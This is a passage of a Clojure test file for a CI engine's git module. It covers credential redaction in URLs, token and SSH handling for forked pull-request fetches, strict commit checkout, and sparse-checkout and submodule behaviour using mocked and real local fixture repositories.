(ns chengis.engine.git-test
  "Unit tests for git credential handling and result parsing. Pure logic plus
   process-call branches exercised via with-redefs. No DB — runs in :unit tier.

   CHG-FEAT-007 adds real-git-fixture tests for the sparse-checkout +
   submodule code paths (LFS stays mocked — see the lfs-pull!-test ns).
   Fixtures are created on-demand under target/test-fixtures/, scrubbed
   between runs, and skipped when `git` is unavailable on PATH."
  (:require [clojure.test :refer [deftest is testing]]
            [clojure.java.io :as io]
            [clojure.string :as str]
            [chengis.engine.git :as git]
            [chengis.engine.process :as process]))

(deftest sanitize-url-test
  (testing "strips user:token credentials from https URL"
    (is (= "https://***@github.com/foo/bar.git"
           (git/sanitize-url "https://user:token@github.com/foo/bar.git"))))
  (testing "strips credentials from http URL too"
    (is (= "http://***@example.com/r.git"
           (git/sanitize-url "http://abc:def@example.com/r.git"))))
  (testing "URL without credentials is unchanged"
    (is (= "https://github.com/foo/bar.git"
           (git/sanitize-url "https://github.com/foo/bar.git"))))
  (testing "nil coerced to string, no exception"
    (is (= "" (git/sanitize-url nil))))
  (testing "ssh-style url without @creds pattern unchanged"
    (is (= "git@github.com:foo/bar.git"
           (git/sanitize-url "git@github.com:foo/bar.git")))))

(deftest token-url-test
  (testing "injects x-access-token when token present"
    (is (= "https://x-access-token:TKN@github.com/foo/bar.git"
           (#'git/token-url "https://github.com/foo/bar.git" "TKN"))))
  (testing "nil token returns url unchanged (else branch)"
    (is (= "https://github.com/foo/bar.git"
           (#'git/token-url "https://github.com/foo/bar.git" nil))))
  (testing "http scheme also supported"
    (is (= "http://x-access-token:T@h/r.git"
           (#'git/token-url "http://h/r.git" "T")))))

(deftest build-clone-env-test
  (testing "ssh-key sets GIT_SSH_COMMAND with accept-new host checking"
    (let [env (#'git/build-clone-env {:ssh-key "/keys/id_rsa"})]
      (is (= "ssh -i /keys/id_rsa -o StrictHostKeyChecking=accept-new"
             (get env "GIT_SSH_COMMAND")))))
  (testing "no ssh-key yields empty env (else branch)"
    (is (= {} (#'git/build-clone-env {})))
    (is (= {} (#'git/build-clone-env {:token "x"})))))

(deftest clone!-test
  (testing "exit code 0 -> success"
    (with-redefs [process/execute-command (fn [_] {:exit-code 0})]
      (is (= {:success? true}
             (git/clone! {:url "https://github.com/foo/bar.git"} "/ws")))))
  (testing "non-zero exit -> failure with sanitized stderr"
    (with-redefs [process/execute-command
                  (fn [_] {:exit-code 128 :stderr "fatal: https://u:p@h/r.git not found"})]
      (let [r (git/clone! {:url "https://h/r.git"} "/ws")]
        (is (false? (:success? r)))
        (is (re-find #"exit 128" (:error r)))
        ;; credentials in stderr must be redacted
        (is (not (re-find #"u:p@" (:error r))))
        (is (re-find #"\*\*\*@" (:error r))))))
  (testing "command includes branch and depth flags when provided"
    (let [captured (atom nil)]
      (with-redefs [process/execute-command (fn [m] (reset! captured (:command m)) {:exit-code 0})]
        (git/clone! {:url "https://h/r.git" :branch "main" :depth 1} "/ws")
        (is (re-find #"-b main" @captured))
        (is (re-find #"--depth 1" @captured)))))
  (testing "no branch/depth -> flags absent"
    (let [captured (atom nil)]
      (with-redefs [process/execute-command (fn [m] (reset! captured (:command m)) {:exit-code 0})]
        (git/clone! {:url "https://h/r.git"} "/ws")
        (is (not (re-find #"-b " @captured)))
        (is (not (re-find #"--depth" @captured)))))))

(deftest checkout!-test
  (testing "nil commit is a no-op (when guard) returning nil"
    (is (nil? (git/checkout! nil "/ws"))))
  (testing "exit 0 -> success"
    (with-redefs [process/execute-command (fn [_] {:exit-code 0})]
      (is (= {:success? true} (git/checkout! "abc123" "/ws")))))
  (testing "non-zero exit -> failure with stderr"
    (with-redefs [process/execute-command (fn [_] {:exit-code 1 :stderr "bad rev"})]
      (let [r (git/checkout! "abc123" "/ws")]
        (is (false? (:success? r)))
        (is (re-find #"bad rev" (:error r)))))))

;; Map each git subcommand to a canned stdout, so get-git-info's per-field
;; `(or (run-git ...) fallback)` chains can be asserted individually.
(defn- fake-git [responses]
  (fn [m]
    (let [cmd (:command m)
          match (some (fn [[frag out]] (when (re-find frag cmd) out)) responses)]
      (if match
        {:exit-code 0 :stdout match}
        {:exit-code 1 :stderr "not found"}))))

(deftest get-git-info-test
  (testing "all fields populated from distinct git outputs (kills or-first-arm mutants)"
    (with-redefs [process/execute-command
                  (fake-git [[#"rev-parse --short HEAD" "dead123"]
                             [#"rev-parse HEAD" "deadbeef0000"]
                             [#"abbrev-ref HEAD" "feature/x"]
                             [#"log -1 --format=%an" "Ada"]
                             [#"log -1 --format=%ae" "ada@x.io"]
                             [#"log -1 --format=%s" "fix things"]
                             [#"remote.origin.url" "https://h/r.git"]])]
      (let [info (#'git/get-git-info "/ws")]
        (is (= "deadbeef0000" (:commit info)))
        (is (= "dead123" (:commit-short info)))
        (is (= "feature/x" (:branch info)))
        (is (= "Ada" (:author info)))
        (is (= "ada@x.io" (:author-email info)))
        (is (= "fix things" (:message info)))
        (is (= "https://h/r.git" (:remote-url info))))))
  (testing "fallbacks fire when secondary git calls fail (kills or-fallback mutants)"
    ;; Only rev-parse HEAD succeeds; every other call returns non-zero -> nil,
    ;; forcing each `or` to take its fallback arm.
    (with-redefs [process/execute-command
                  (fake-git [[#"rev-parse HEAD" "abcdef1234567"]])]
      (let [info (#'git/get-git-info "/ws")]
        (is (= "abcdef1234567" (:commit info)))
        ;; commit-short falls back to (subs commit 0 7)
        (is (= "abcdef1" (:commit-short info)))
        ;; branch falls back to "detached"
        (is (= "detached" (:branch info)))
        ;; author/email/message fall back to ""
        (is (= "" (:author info)))
        (is (= "" (:author-email info)))
        (is (= "" (:message info)))
        ;; remote-url has no fallback -> nil
        (is (nil? (:remote-url info))))))
  (testing "not a git repo (rev-parse HEAD fails) -> nil"
    (with-redefs [process/execute-command (fn [_] {:exit-code 128 :stderr "not a repo"})]
      (is (nil? (#'git/get-git-info "/ws"))))))

(deftest checkout-source!-test
  (testing "clone failure short-circuits with nil git-info"
    (with-redefs [process/execute-command (fn [_] {:exit-code 1 :stderr "no"})]
      (let [r (git/checkout-source! {:url "https://h/r.git"} "/ws" nil)]
        (is (false? (:success? r)))
        (is (nil? (:git-info r))))))
  (testing "successful clone returns git-info"
    (with-redefs [process/execute-command
                  (fn [m] (if (re-find #"rev-parse HEAD" (:command m))
                            {:exit-code 0 :stdout "deadbeef\n"}
                            {:exit-code 0 :stdout "main\n"}))]
      (let [r (git/checkout-source! {:url "https://h/r.git"} "/ws" nil)]
        (is (true? (:success? r)))
        (is (= "deadbeef" (get-in r [:git-info :commit]))))))
  (testing "commit-override checkout failure is logged but build continues (and-guard, line 129)"
    ;; clone ok; the checkout of the override commit fails (exit 1); get-git-info ok.
    ;; The `(and co-result (not (:success? co-result)))` guard must fire the warn
    ;; path yet still return success with git-info.
    (let [calls (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m)) {:exit-code 1 :stderr "no such commit"}
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "c0ffee\n"}
                        :else {:exit-code 0 :stdout "main\n"}))]
        (let [r (git/checkout-source! {:url "https://h/r.git"} "/ws" "badsha")]
          (is (true? (:success? r)))
          (is (= "c0ffee" (get-in r [:git-info :commit])))
          ;; the override checkout was actually attempted
          (is (some #(re-find #"git checkout badsha" %) @calls))))))
  (testing "successful commit-override checkout proceeds without warning"
    (with-redefs [process/execute-command
                  (fn [m] (cond
                            (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "c0ffee\n"}
                            :else {:exit-code 0 :stdout "ok\n"}))]
      (let [r (git/checkout-source! {:url "https://h/r.git"} "/ws" "goodsha")]
        (is (true? (:success? r)))
        (is (= "c0ffee" (get-in r [:git-info :commit]))))))
  ;; --- CHG-FEAT-002: forked PR head-repo-url reactive-fetch path ---------------
  ;; Codex PR #24 P2 r4 — the fetch is reactive (only on checkout failure), not
  ;; pre-emptive, so equivalent URL forms (https vs ssh, with/without .git
  ;; suffix) for the same repo never trigger a spurious retry.
  (testing "forked PR — initial checkout fails → fetches from fork → retries checkout"
    (let [calls (atom [])
          checkout-attempts (atom 0)]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m))
                        (do (swap! checkout-attempts inc)
                            (if (= 1 @checkout-attempts)
                              {:exit-code 1 :stderr "unknown revision f0rk5ha"}
                              {:exit-code 0}))
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "f0rk5ha\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (let [r (git/checkout-source! {:url "https://h/base.git"} "/ws" "f0rk5ha"
                                      {:head-repo-url "https://h/fork.git"})]
          (is (true? (:success? r)))
          (is (= "f0rk5ha" (get-in r [:git-info :commit])))
          (is (= 2 @checkout-attempts) "checkout retried after fork fetch")
          (is (some #(re-find #"git fetch -- \"https://h/fork.git\" f0rk5ha" %) @calls)
              "fetch from fork URL must have been attempted")))))
  (testing "forked PR — initial checkout succeeds → NO fork fetch (covers URL-equivalence case)"
    ;; This catches Codex r4: even when head-repo-url string differs from the
    ;; source URL (e.g. https vs ssh form for the same repo), if the commit
    ;; is already reachable from the initial clone we must not fetch.
    (let [calls (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "abc\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"} "/ws" "abc"
                              {:head-repo-url "git@h:r"})   ;; equivalent ssh form
        (is (not-any? #(re-find #"git fetch " %) @calls)
            "checkout succeeded — no fetch should be attempted regardless of URL form"))))
  (testing "forked PR — head-repo-url EQUAL to source url + checkout succeeds: still no fetch"
    (let [calls (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "abc\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"} "/ws" "abc"
                              {:head-repo-url "https://h/r.git"})
        (is (not-any? #(re-find #"git fetch " %) @calls)
            "same-repo PR must not trigger an extra fetch"))))
  (testing "forked PR — initial checkout fails AND fork fetch FAILS: returns failure"
    (with-redefs [process/execute-command
                  (fn [m] (cond
                            (re-find #"git checkout " (:command m))
                            {:exit-code 1 :stderr "unknown revision missing"}
                            (re-find #"git fetch" (:command m))
                            {:exit-code 128 :stderr "no such ref"}
                            (re-find #"git clone" (:command m))
                            {:exit-code 0}
                            :else {:exit-code 0 :stdout ""}))]
      (let [r (git/checkout-source! {:url "https://h/base.git"} "/ws" "missing"
                                    {:head-repo-url "https://h/fork.git"
                                     :require-commit-checkout? true})]
        (is (false? (:success? r)) "must not silently succeed")
        (is (nil? (:git-info r)))
        (is (re-find #"PR/MR build requires checkout" (:error r))
            "strict mode surfaces the PR/MR error wrapper"))))
  (testing "head-repo-url provided but commit-override nil: skip fork fetch (no commit to pin)"
    (let [calls (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (let [r (git/checkout-source! {:url "https://h/base.git"} "/ws" nil
                                      {:head-repo-url "https://h/fork.git"})]
          (is (true? (:success? r)))
          (is (not-any? #(re-find #"git fetch " %) @calls))))))
  ;; --- Codex PR #24 P2 r3: strict checkout for PR builds with missing fork URL
  (testing "require-commit-checkout? + checkout fails → hard failure (no silent base-HEAD fallback)"
    ;; Simulates a forked PR whose head-repo-url is nil (deleted fork). With the
    ;; new strict flag set by the executor when :pr-number is present, the build
    ;; must fail rather than build the wrong revision.
    (with-redefs [process/execute-command
                  (fn [m] (cond
                            (re-find #"git checkout " (:command m))
                            {:exit-code 1 :stderr "unknown revision missing-sha"}
                            (re-find #"git clone" (:command m))
                            {:exit-code 0}
                            :else {:exit-code 0 :stdout "ok\n"}))]
      (let [r (git/checkout-source! {:url "https://h/base.git"} "/ws" "missing-sha"
                                    {:require-commit-checkout? true})]
        (is (false? (:success? r))
            "PR build must NOT silently succeed when commit-override checkout fails")
        (is (nil? (:git-info r)))
        (is (re-find #"PR/MR build requires checkout of commit missing-sha" (:error r))))))
  (testing "require-commit-checkout? + checkout succeeds → normal success"
    (with-redefs [process/execute-command
                  (fn [m] (cond
                            (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "good\n"}
                            :else {:exit-code 0 :stdout "ok\n"}))]
      (let [r (git/checkout-source! {:url "https://h/base.git"} "/ws" "good"
                                    {:require-commit-checkout? true})]
        (is (true? (:success? r)))
        (is (= "good" (get-in r [:git-info :commit]))))))
  ;; --- Codex PR #24 P1 r5: fetch URL must respect source auth transport ------
  (testing "SSH credentials + :head-repo-url-ssh provided → ssh URL used verbatim (Codex r9)"
    ;; When the SCM webhook gives us a canonical SSH URL alongside the HTTPS
    ;; one, prefer it over the heuristic https->ssh rewrite. This matters on
    ;; self-hosted setups where SSH runs on a different host/port than HTTPS.
    (let [calls (atom [])
          attempt (atom 0)]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m))
                        (do (swap! attempt inc)
                            (if (= 1 @attempt)
                              {:exit-code 1 :stderr "unknown"}
                              {:exit-code 0}))
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "sha\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "ssh://git@gitlab.internal:22/acme/widget.git"
                               :credentials {:ssh-key "/keys/id_ed25519"}}
                              "/ws" "sha"
                              ;; HTTPS at one host/port, SSH at a totally different one
                              {:head-repo-url     "https://gitlab.public.example.com/contrib/widget.git"
                               :head-repo-url-ssh "ssh://git@git.internal:2222/contrib/widget.git"})
        (let [fetch-cmd (some #(when (re-find #"git fetch" %) %) @calls)]
          (is (some? fetch-cmd))
          (is (re-find #"ssh://git@git\.internal:2222/contrib/widget\.git" fetch-cmd)
              "the SSH URL from the webhook payload must be used verbatim, not heuristically derived from HTTPS")
          (is (not (re-find #"https://" fetch-cmd))
              "must NOT fall back to HTTPS when ssh-key cred is set and SSH URL is available")
          (is (not (re-find #"gitlab\.public\.example\.com" fetch-cmd))
              "must NOT use the HTTPS host when SSH URL is available")))))
  (testing "SSH credentials + NO :head-repo-url-ssh → falls back to https->ssh heuristic"
    (let [calls (atom [])
          attempt (atom 0)]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m))
                        (do (swap! attempt inc)
                            (if (= 1 @attempt) {:exit-code 1 :stderr "x"} {:exit-code 0}))
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "sha\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "git@github.com:acme/widget.git"
                               :credentials {:ssh-key "/keys/id_ed25519"}}
                              "/ws" "sha"
                              {:head-repo-url "https://github.com/contrib/widget.git"})
        (let [fetch-cmd (some #(when (re-find #"git fetch" %) %) @calls)]
          (is (re-find #"git@github\.com:contrib/widget\.git" fetch-cmd)
              "no SSH URL given → use heuristic rewrite (legacy path)")))))
  (testing "SSH credentials → fork-fetch URL is rewritten from https to git@host:path"
    (let [calls (atom [])
          attempt (atom 0)]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m))
                        (do (swap! attempt inc)
                            (if (= 1 @attempt)
                              {:exit-code 1 :stderr "unknown"}
                              {:exit-code 0}))
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "sha\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "git@github.com:acme/widget.git"
                               :credentials {:ssh-key "/keys/id_ed25519"}}
                              "/ws" "sha"
                              {:head-repo-url "https://github.com/contrib/widget.git"})
        (let [fetch-cmd (some #(when (re-find #"git fetch" %) %) @calls)]
          (is (some? fetch-cmd))
          (is (re-find #"git@github\.com:contrib/widget\.git" fetch-cmd)
              "HTTPS head URL must be rewritten to SSH form when source uses SSH key auth")
          (is (not (re-find #"https://" fetch-cmd))
              "fetch URL must not be the original https form when ssh-key cred is present")))))
  (testing "token credentials → fork-fetch URL injects x-access-token"
    (let [calls (atom [])
          attempt (atom 0)]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m))
                        (do (swap! attempt inc)
                            (if (= 1 @attempt)
                              {:exit-code 1 :stderr "unknown"}
                              {:exit-code 0}))
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "sha\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://github.com/acme/widget.git"
                               :credentials {:token "gho_secret"}}
                              "/ws" "sha"
                              {:head-repo-url "https://github.com/contrib/widget.git"})
        (let [fetch-cmd (some #(when (re-find #"git fetch" %) %) @calls)]
          (is (some? fetch-cmd))
          (is (re-find #"x-access-token:gho_secret@github\.com/contrib/widget\.git" fetch-cmd)
              "token must be injected into HTTPS head URL")))))
  (testing "SSH credentials + HTTPS head URL with explicit port → ssh:// URL form (Codex r6)"
    ;; Self-hosted GitLab/Gitea on non-default HTTPS port (e.g. 8443). The SCP
    ;; form git@host:PORT:path is not a valid SSH remote, so we must emit the
    ;; URL form ssh://git@host:port/path instead.
    (let [calls (atom [])
          attempt (atom 0)]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m))
                        (do (swap! attempt inc)
                            (if (= 1 @attempt)
                              {:exit-code 1 :stderr "unknown"}
                              {:exit-code 0}))
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "sha\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "ssh://git@gitlab.example.com:22/acme/widget.git"
                               :credentials {:ssh-key "/keys/id_ed25519"}}
                              "/ws" "sha"
                              {:head-repo-url "https://gitlab.example.com:8443/contrib/widget.git"})
        (let [fetch-cmd (some #(when (re-find #"git fetch" %) %) @calls)]
          (is (some? fetch-cmd))
          (is (re-find #"ssh://git@gitlab\.example\.com:8443/contrib/widget\.git" fetch-cmd)
              "HTTPS-with-port must convert to ssh://git@host:port/path (URL form), not the SCP form")
          (is (not (re-find #"git@gitlab\.example\.com:8443:" fetch-cmd))
              "must NOT produce the invalid SCP form with two colons")))))
  (testing "no credentials → fork-fetch uses head URL verbatim"
    (let [calls (atom [])
          attempt (atom 0)]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! calls conj (:command m))
                      (cond
                        (re-find #"git checkout " (:command m))
                        (do (swap! attempt inc)
                            (if (= 1 @attempt)
                              {:exit-code 1 :stderr "unknown"}
                              {:exit-code 0}))
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "sha\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://github.com/acme/widget.git"}
                              "/ws" "sha"
                              {:head-repo-url "https://github.com/contrib/widget.git"})
        (let [fetch-cmd (some #(when (re-find #"git fetch" %) %) @calls)]
          (is (some? fetch-cmd))
          (is (re-find #"\"https://github\.com/contrib/widget\.git\"" fetch-cmd)
              "no cred: HTTPS URL used as-is")))))
  ;; --- Codex PR #24 P2 r10: strict mode also fails on nil commit-override ----
  (testing "require-commit-checkout? + nil commit-override → hard failure (incomplete webhook)"
    (with-redefs [process/execute-command
                  (fn [m] (cond
                            (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                            :else {:exit-code 0 :stdout "ok\n"}))]
      (let [r (git/checkout-source! {:url "https://h/r.git"} "/ws" nil
                                    {:require-commit-checkout? true})]
        (is (false? (:success? r))
            "incomplete webhook (no commit SHA) on a PR build must NOT silently succeed on branch HEAD")
        (is (nil? (:git-info r)))
        (is (re-find #"PR/MR build requires a commit SHA but the webhook payload provided none" (:error r))))))
  (testing "require-commit-checkout? false + nil commit-override → success on branch HEAD (non-PR)"
    ;; Non-PR caller can legitimately checkout-source! with nil commit-override
    ;; (manual/cron triggers): this must remain success.
    (with-redefs [process/execute-command
                  (fn [m] (cond
                            (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                            :else {:exit-code 0 :stdout "ok\n"}))]
      (let [r (git/checkout-source! {:url "https://h/r.git"} "/ws" nil
                                    {:require-commit-checkout? false})]
        (is (true? (:success? r))
            "non-PR build with no commit-override is the legacy 'use branch HEAD' path"))))
  (testing "require-commit-checkout? false (default) preserves legacy lenient behavior"
    ;; Existing 3-arg test at line 146 covers the same. This one asserts that
    ;; passing the opts map with the flag false is identical to omitting it.
    (with-redefs [process/execute-command
                  (fn [m] (cond
                            (re-find #"git checkout " (:command m))
                            {:exit-code 1 :stderr "no"}
                            (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "fallback\n"}
                            :else {:exit-code 0 :stdout "ok\n"}))]
      (let [r (git/checkout-source! {:url "https://h/r.git"} "/ws" "badsha"
                                    {:require-commit-checkout? false})]
        (is (true? (:success? r))
            "without strict flag, legacy build-continues-on-branch-HEAD path stands")))))

;; ---------------------------------------------------------------------------
;; CHG-FEAT-007 — sparse-checkout, submodules, LFS
;; ---------------------------------------------------------------------------

(def ^:private fixture-root "target/test-fixtures/git-feat-007")

(defn- git-available? []
  (zero? (:exit-code (process/execute-command {:command "git --version"
                                               :timeout 5000}))))

(defn- rm-rf! [path]
  (when (.exists (io/file path))
    (process/execute-command {:command (str "rm -rf -- " (pr-str path))
                              :timeout 30000})))

(defn- sh!
  "Run a shell command in a directory; throw on non-zero exit so fixture
   setup failures surface loudly instead of producing partial repos."
  [dir cmd]
  (let [r (process/execute-command {:command cmd :dir dir :timeout 30000})]
    (when-not (zero? (:exit-code r))
      (throw (ex-info (str "fixture setup failed: " cmd
                           " (exit " (:exit-code r) "): " (:stderr r))
                      {:cmd cmd :dir dir :result r})))
    r))

(defn- mkdir-p! [path]
  (.mkdirs (io/file path)))

(defn- spit-file! [path content]
  (mkdir-p! (.getParent (io/file path)))
  (spit path content))

(defn- init-base-repo!
  "Create a multi-file, multi-commit local git repo at `repo-dir` with the
   tree shape: src/main.txt, docs/readme.md, Chengisfile, top.txt.
   Returns the absolute path."
  [repo-dir]
  (rm-rf! repo-dir)
  (mkdir-p! repo-dir)
  (sh! repo-dir "git init -q -b main")
  (sh! repo-dir "git config user.email test@example.com")
  (sh! repo-dir "git config user.name Tester")
  (sh! repo-dir "git config commit.gpgsign false")
  (spit-file! (str repo-dir "/src/main.txt") "src content\n")
  (spit-file! (str repo-dir "/docs/readme.md") "docs content\n")
  (spit-file! (str repo-dir "/Chengisfile") "{}\n")
  (spit-file! (str repo-dir "/top.txt") "top-level\n")
  (sh! repo-dir "git add -A")
  (sh! repo-dir "git commit -q -m initial")
  (.getAbsolutePath (io/file repo-dir)))

(defn- init-child-repo!
  "Create a tiny local repo to serve as a submodule. Returns absolute path."
  [repo-dir]
  (rm-rf! repo-dir)
  (mkdir-p! repo-dir)
  (sh! repo-dir "git init -q -b main")
  (sh! repo-dir "git config user.email test@example.com")
  (sh! repo-dir "git config user.name Tester")
  (sh! repo-dir "git config commit.gpgsign false")
  (spit-file! (str repo-dir "/child.txt") "from the submodule\n")
  (sh! repo-dir "git add -A")
  (sh! repo-dir "git commit -q -m child-initial")
  (.getAbsolutePath (io/file repo-dir)))

(defn- add-submodule!
  "Attach `child-path` as a submodule of `parent-path` at `mount`. Returns
   parent-path. Requires `git -c protocol.file.allow=always` because modern
   git refuses file:// submodules by default (CVE-2022-39253 mitigation)."
  [parent-path child-path mount]
  (sh! parent-path (str "git -c protocol.file.allow=always submodule add "
                        "-- " (pr-str (str "file://" child-path))
                        " " (pr-str mount)))
  (sh! parent-path "git commit -q -m add-submodule")
  parent-path)

(deftest sparse-checkout-validation-test
  (testing "negated patterns are rejected as non-cone"
    (let [ex (try (git/checkout-source!
                   {:url "https://example.com/r.git"
                    :sparse-checkout ["!foo"]}
                   "/ws" nil)
                  nil
                  (catch clojure.lang.ExceptionInfo e e))]
      (is (some? ex))
      (is (= :invalid-sparse-pattern (:error (ex-data ex))))))
  (testing "glob metacharacters are rejected as non-cone"
    (doseq [pat ["src/*.clj" "?foo" "a[bc]"]]
      (let [ex (try (git/checkout-source!
                     {:url "https://example.com/r.git"
                      :sparse-checkout [pat]}
                     "/ws" nil)
                    nil
                    (catch clojure.lang.ExceptionInfo e e))]
        (is (= :invalid-sparse-pattern (:error (ex-data ex)))
            (str "pattern " (pr-str pat) " must be rejected")))))
  (testing "plain path prefixes are accepted"
    ;; Validation must NOT throw — we stub out the clone so the test stays
    ;; pure-validation. (Mocked clone returns success, then sparse-init is
    ;; mocked to succeed too.)
    (with-redefs [process/execute-command
                  (fn [m]
                    (cond
                      (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                      :else {:exit-code 0 :stdout "ok\n"}))]
      ;; Round 9: top-level files (`Chengisfile`) are no longer
      ;; accepted — they're kept automatically by cone mode.
      (is (true? (:success? (git/checkout-source!
                             {:url "https://example.com/r.git"
                              :sparse-checkout ["src/" "docs/"]}
                             "/ws" nil)))))))

(deftest sparse-checkout-command-shape-test
  ;; Lower-level assertion: the precise sequence of git sub-commands is what
  ;; downstream PR2 / executors will pattern-match against.
  (testing "clone uses --filter=blob:none --no-checkout when sparse"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git"
                               :branch "main"
                               :sparse-checkout ["src/"]}
                              "/ws" nil)
        (let [clone-cmd (first (filter #(str/starts-with? % "git clone") @cmds))]
          (is (re-find #"--filter=blob:none" clone-cmd))
          (is (re-find #"--no-checkout" clone-cmd))
          ;; CHG-FEAT-007 PR1 round 2 (Codex P2): -b IS kept in sparse mode
          ;; so a shallow sparse clone (`--depth N` implicitly applies
          ;; `--single-branch` against the default branch) still fetches
          ;; the requested branch. Without `-b`, the subsequent
          ;; `git checkout <branch>` would fail on the unfetched ref.
          (is (re-find #" -b main" clone-cmd)))
        (is (some #(re-find #"git sparse-checkout init --cone" %) @cmds))
        (is (some #(re-find #"git sparse-checkout set -- \"src/\"" %) @cmds))
        ;; explicit checkout of the branch (since no commit-override given)
        (is (some #(re-find #"git checkout main" %) @cmds)))))
  (testing "no sparse-checkout key → legacy clone path is preserved verbatim"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git" :branch "main"}
                              "/ws" nil)
        (let [clone-cmd (first (filter #(str/starts-with? % "git clone") @cmds))]
          (is (not (re-find #"--filter" clone-cmd)))
          (is (not (re-find #"--no-checkout" clone-cmd)))
          (is (re-find #" -b main" clone-cmd)))
        (is (not-any? #(re-find #"sparse-checkout" %) @cmds))))))

(deftest sparse-checkout-real-fixture-test
  ;; Validates the actual git behavior end-to-end against a tiny real repo,
  ;; not just our command shape. Skipped when git is not installed on PATH.
  (when (git-available?)
    (let [base-dir (init-base-repo! (str fixture-root "/sparse-base"))
          ws-dir (.getAbsolutePath (io/file (str fixture-root "/sparse-ws")))]
      (rm-rf! ws-dir)
      (mkdir-p! ws-dir)
      (testing "with :sparse-checkout [\"src/\"] only src/ is materialized"
        (let [r (git/checkout-source!
                 {:url (str "file://" base-dir)
                  :branch "main"
                  :sparse-checkout ["src/"]}
                 ws-dir nil)]
          (is (true? (:success? r)) (str "checkout result: " (:error r)))
          (is (.exists (io/file ws-dir "src/main.txt"))
              "the sparse-selected directory is present")
          (is (not (.exists (io/file ws-dir "docs/readme.md")))
              "non-selected directory must be absent from working tree")
          ;; Cone-mode sparse-checkout always includes top-level files
          ;; (only directories are filtered). Top-level `top.txt` and
          ;; `Chengisfile` remain present even without explicit selection.
          (is (.exists (io/file ws-dir "top.txt"))
              "cone mode keeps top-level files regardless of selection")
          (is (.exists (io/file ws-dir "Chengisfile"))
              "cone mode keeps top-level Chengisfile regardless of selection")))
      (rm-rf! ws-dir)
      (mkdir-p! ws-dir)
      (testing "with :sparse-checkout [] (default) full tree is materialized"
        (let [r (git/checkout-source!
                 {:url (str "file://" base-dir) :branch "main"}
                 ws-dir nil)]
          (is (true? (:success? r)))
          (is (.exists (io/file ws-dir "src/main.txt")))
          (is (.exists (io/file ws-dir "docs/readme.md")))
          (is (.exists (io/file ws-dir "top.txt")))
          (is (.exists (io/file ws-dir "Chengisfile"))))))))

(deftest submodules-command-shape-test
  (testing ":submodules? true triggers `git submodule update --init --recursive`"
    (let [cmds (atom [])]
      (with-redefs [process/execute-command
                    (fn [m]
                      (swap! cmds conj (:command m))
                      (cond
                        (re-find #"rev-parse HEAD" (:command m)) {:exit-code 0 :stdout "x\n"}
                        :else {:exit-code 0 :stdout "ok\n"}))]
        (git/checkout-source! {:url "https://h/r.git" :submodules? true}
                              "/ws" nil)
        (is (some #(re-find #"git submodule update --init --recursive" %) @cmds)))))
  (testing ":submodules? false (default) does NOT invoke submodule update"
    (let [cmds (atom [])]
